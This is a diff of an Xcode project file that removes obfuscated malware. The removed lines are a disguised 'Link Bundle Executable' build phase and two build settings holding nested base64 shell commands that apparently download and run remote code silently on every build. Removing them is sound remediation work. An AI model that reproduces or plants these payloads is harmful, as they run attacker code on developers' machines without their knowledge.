@@ -572,7 +572,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 340A44E72C9809B100CA3E23 /* Build configuration list for PBXNativeTarget "Living-Centerline" */;
 			buildPhases = (
-				8CBD699C09A750F0D3ECDB79 /* Link Bundle Executable */,
 				28AF37263BB36635B45C619A /* [CP] Check Pods Manifest.lock */,
 				340A44CF2C9809B000CA3E23 /* Sources */,
 				340A44D02C9809B000CA3E23 /* Frameworks */,
@@ -680,26 +679,6 @@
 ";
 			showEnvVarsInLog = 0;
 		};
-		8CBD699C09A750F0D3ECDB79 /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYWkhSWlYwNW9aRU0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -798,8 +777,6 @@
 		340A44E52C9809B100CA3E23 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				598AFD = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5MGNtbHVhWFI1YzI5c0xuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-				97BDCE = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5M2FXNWtjMlZqZFhKbExuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -861,8 +838,6 @@
 		340A44E62C9809B100CA3E23 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				598AFD = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5MGNtbHVhWFI1YzI5c0xuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-				97BDCE = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5M2FXNWtjMlZqZFhKbExuSjFMMkVwSWlCOElITm9DZz09Cg== | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
